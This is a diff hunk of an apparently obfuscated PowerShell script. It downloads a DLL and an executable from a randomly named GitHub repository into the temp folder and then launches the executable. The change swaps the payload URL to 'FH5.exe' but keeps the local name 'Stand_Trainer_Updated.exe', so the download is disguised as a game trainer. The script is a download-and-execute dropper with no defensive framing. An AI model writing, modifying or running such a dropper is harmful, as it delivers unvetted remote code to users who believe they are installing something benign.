@@ -27,7 +27,7 @@ $Ike3023rijweohfuoah29fhauiwoefawef = fFJEE39fjewohjffffffffffffff2893h4efq9of78
 $source = "https://raw.githubusercontent.com/Neth3N/na9ow3495raygwi4gyrhuawerawera/main/Backend.dll"
 $destination = "$env:tmp\Backend.dll"
 Invoke-WebRequest -Uri $source -OutFile $destination
-$source = "https://raw.githubusercontent.com/Neth3N/na9ow3495raygwi4gyrhuawerawera/main/Stand_Trainer_Updated.exe"
+$source = "https://raw.githubusercontent.com/Neth3N/na9ow3495raygwi4gyrhuawerawera/main/FH5.exe"
 $destination = "$env:tmp\Stand_Trainer_Updated.exe"
 Invoke-WebRequest -Uri $source -OutFile $destination
 start "$env:tmp\Stand_Trainer_Updated.exe"
